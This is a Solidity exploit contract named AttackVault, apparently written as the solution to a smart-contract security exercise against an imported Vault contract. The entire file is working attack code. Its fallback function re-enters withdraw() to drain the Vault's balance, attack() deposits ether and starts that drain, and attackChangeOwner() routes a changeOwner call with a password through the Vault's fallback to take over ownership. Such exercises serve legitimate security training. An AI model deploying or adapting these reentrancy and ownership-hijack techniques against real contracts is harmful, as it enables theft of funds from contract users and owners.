// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Script, console} from "forge-std/Script.sol";

contract AttackVault is Ownable {
    address payable attckAddress;

    constructor(address attckAddress_, address owner_) Ownable(owner_) {
        attckAddress = payable(attckAddress_);
    }

    fallback() external payable {
        _attackWithDraw();
    }

    function _attackWithDraw() private {
        if (address(attckAddress).balance > 0 ether) {
            Vault(attckAddress).withdraw();
        }
    }

    function attack() external payable onlyOwner {
        uint256 amount = msg.value;
        require(amount > 0, "amount must gt 0");

        Vault(attckAddress).deposite{value: amount}();
        Vault(attckAddress).withdraw();
    }

    function attackChangeOwner(bytes32 _password, address newOwner) public onlyOwner() {
        // 构造调用数据
        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", _password, newOwner);

        // 通过Vault合约的fallback函数调用
        (bool success,) = attckAddress.call(data);
        require(success, "attackChangeOwner failed");
    }
}